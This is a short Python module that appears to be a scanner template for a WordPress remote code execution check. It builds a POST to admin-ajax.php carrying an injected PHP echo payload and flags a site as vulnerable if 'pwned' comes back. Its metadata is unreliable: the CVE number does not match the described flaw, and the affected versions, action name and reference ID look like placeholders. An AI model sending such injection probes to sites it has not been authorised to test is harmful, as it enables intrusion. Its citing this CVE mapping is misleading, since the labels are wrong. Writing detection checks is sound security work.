"""
CVE-2020-36326: WordPress Plugin Remote Code Execution
Description: Remote code execution vulnerability in WordPress plugin through unauthenticated AJAX endpoint
Severity: Critical
CVSS Score: 9.8
Affected Versions: Multiple WordPress plugins
Reference: https://wpscan.com/vulnerability/54321
"""

def get_payload():
    return {
        'path': '/wp-admin/admin-ajax.php',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        'data': {
            'action': 'test_ajax',
            'data': '<?php echo "pwned"; ?>'
        }
    }

def check_response(response):
    return response.status_code == 200 and 'pwned' in response.text 